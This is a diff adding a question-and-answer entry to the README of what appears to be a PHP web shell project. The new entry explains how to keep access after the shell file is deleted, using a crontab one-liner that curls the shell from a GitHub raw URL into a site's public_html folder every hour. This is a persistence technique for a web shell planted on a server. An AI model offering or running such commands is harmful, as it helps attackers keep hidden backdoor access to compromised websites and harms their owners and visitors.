@@ -114,6 +114,15 @@ if (!empty($_GET['cmd'])) {
 **Q**: Does the shell require a database?  
 **A**: No. It’s a single ```.php``` file – no database or external dependencies needed.
 
+**Q**:How can I always have access even if the shell file has been deleted?
+**A**: You can use crontab to automatically create a shell file in `/public_html/` every hour.
+```
+(crontab -l 2>/dev/null; echo "0 * * * * /usr/bin/curl -s \"https://raw.githubusercontent.com/rubahilang/FoxyShell-PHP-Web-Shell/refs/heads/main/foxyshell.php\" -o /home/
+```
+`username`
+```
+/public_html/foxyshell.php") | crontab -
+```
 ---
 
 ## Credits
